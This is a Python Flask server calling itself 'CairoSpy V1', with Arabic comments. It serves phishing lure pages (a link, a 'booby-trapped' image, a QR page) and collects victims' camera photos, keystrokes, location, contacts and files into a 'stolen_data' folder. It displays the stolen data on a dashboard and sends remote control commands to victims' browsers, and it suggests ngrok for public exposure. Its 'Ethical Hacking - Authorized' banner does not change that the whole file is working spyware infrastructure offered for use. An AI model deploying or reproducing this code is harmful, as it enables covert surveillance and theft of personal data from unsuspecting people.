#!/usr/bin/env python3
import os
import json
import base64
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO, emit
import logging
import socket

# إعدادات
app = Flask(__name__)
app.config['SECRET_KEY'] = 'cairopy_sec_2024'
socketio = SocketIO(app, cors_allowed_origins="*")

# مجلد التخزين
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")
for folder in ['camera', 'keys', 'location', 'contacts', 'files']:
    os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)

VICTIM_IP = "Unknown"

# ========== صفحات الهجوم ==========
@app.route('/')
def index_attack():
    """الرابط الكلاسيكي"""
    return render_template('index.html')

@app.route('/image')
def image_attack():
    """صفحة الصورة الملغمة"""
    return render_template('image.html')

@app.route('/qr')
def qr_attack():
    """صفحة QR"""
    return render_template('qr.html')

# ========== API لجمع البيانات ==========
@app.route('/api/camera', methods=['POST'])
def receive_camera():
    """استقبال صور الكاميرا"""
    data = request.json
    victim_id = data.get('victim_id', 'unknown')
    photo_type = data.get('type', 'front')  # front or back
    image_data = data.get('image', '')
    
    if image_data:
        filename = f"{victim_id}_{photo_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        filepath = os.path.join(STOLEN_DIR, 'camera', filename)
        
        # فك تشفير base64 وحفظ الصورة
        image_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
        with open(filepath, 'wb') as f:
            f.write(image_bytes)
        
        print(f"[📸] صورة {photo_type} مستلمة: {filename}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error", "message": "No image data"}), 400

@app.route('/api/keylog', methods=['POST'])
def receive_keylog():
    """استقبال ضغطات الكيبورد"""
    data = request.json
    global VICTIM_IP
    VICTIM_IP = request.remote_addr
    
    log_entry = {
        'ip': VICTIM_IP,
        'timestamp': datetime.now().isoformat(),
        'keys': data.get('keys', ''),
        'url': data.get('url', '')
    }
    
    filename = f"keylog_{VICTIM_IP.replace('.','_')}_{datetime.now().strftime('%Y%m%d')}.txt"
    filepath = os.path.join(STOLEN_DIR, 'keys', filename)
    
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry) + '\n')
    
    print(f"[⌨️] Keys from {VICTIM_IP}: {data.get('keys', '')[:50]}...")
    return jsonify({"status": "ok"})

@app.route('/api/location', methods=['POST'])
def receive_location():
    """استقبال الموقع"""
    data = request.json
    ip = request.remote_addr
    
    loc_entry = {
        'ip': ip,
        'timestamp': datetime.now().isoformat(),
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'accuracy': data.get('accuracy'),
        'maps_link': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
    }
    
    filename = f"location_{ip.replace('.','_')}.json"
    filepath = os.path.join(STOLEN_DIR, 'location', filename)
    
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(json.dumps(loc_entry) + '\n')
    
    print(f"[📍] Location: {data.get('lat')}, {data.get('lon')}")
    print(f"[📍] Maps: {loc_entry['maps_link']}")
    return jsonify({"status": "ok"})

@app.route('/api/contacts', methods=['POST'])
def receive_contacts():
    """استقبال جهات الاتصال"""
    data = request.json
    ip = request.remote_addr
    
    contacts = data.get('contacts', [])
    filename = f"contacts_{ip.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = os.path.join(STOLEN_DIR, 'contacts', filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(contacts, f, indent=2, ensure_ascii=False)
    
    print(f"[👤] Contacts received: {len(contacts)} entries")
    return jsonify({"status": "ok"})

@app.route('/api/files', methods=['POST'])
def receive_files():
    """استقبال ملفات"""
    data = request.json
    ip = request.remote_addr
    
    file_data = data.get('file', '')
    filename = data.get('filename', f'unknown_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
    
    if file_data:
        file_bytes = base64.b64decode(file_data.split(',')[1] if ',' in file_data else file_data)
        filepath = os.path.join(STOLEN_DIR, 'files', filename)
        with open(filepath, 'wb') as f:
            f.write(file_bytes)
        print(f"[📁] File received: {filename}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/api/control', methods=['POST'])
def control_victim():
    """أوامر التحكم (Toast, Notification, Sound, Vibrate, Open URL)"""
    data = request.json
    action = data.get('action')
    
    # سيتم إرسالها عبر WebSocket للضحية
    if action == 'toast':
        socketio.emit('control', {'action': 'toast', 'message': data.get('message', 'Hello!')})
    elif action == 'notify':
        socketio.emit('control', {'action': 'notify', 'title': data.get('title', 'Alert'), 'body': data.get('body', '')})
    elif action == 'sound':
        socketio.emit('control', {'action': 'sound'})
    elif action == 'vibrate':
        socketio.emit('control', {'action': 'vibrate', 'duration': data.get('duration', 3000)})
    elif action == 'open_url':
        socketio.emit('control', {'action': 'open_url', 'url': data.get('url', 'https://example.com')})
    
    return jsonify({"status": f"sent_{action}"})

# ========== عرض البيانات المسروقة ==========
@app.route('/dashboard')
def dashboard():
    """لوحة تحكم لعرض البيانات"""
    files = {
        'camera': os.listdir(os.path.join(STOLEN_DIR, 'camera')),
        'keys': os.listdir(os.path.join(STOLEN_DIR, 'keys')),
        'location': os.listdir(os.path.join(STOLEN_DIR, 'location')),
        'contacts': os.listdir(os.path.join(STOLEN_DIR, 'contacts')),
        'files': os.listdir(os.path.join(STOLEN_DIR, 'files'))
    }
    return render_template('dashboard.html', files=files, victim_ip=VICTIM_IP)

@app.route('/stolen/<category>/<filename>')
def serve_stolen(category, filename):
    """عرض الملفات المسروقة"""
    return send_file(os.path.join(STOLEN_DIR, category, filename))

# ========== تشغيل السيرفر ==========
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════╗
║        CairoSpy V1 - Ready           ║
║    Ethical Hacking - Authorized      ║
╚══════════════════════════════════════╝
    """)
    
    # عرض IP المحلي
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"[+] Local: http://{local_ip}:5000")
    print("[+] Use ngrok for public access: ngrok http 5000")
    print("[+] Pages: / (link), /image, /qr")
    print("[+] Dashboard: /dashboard")
    print("="*50)
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)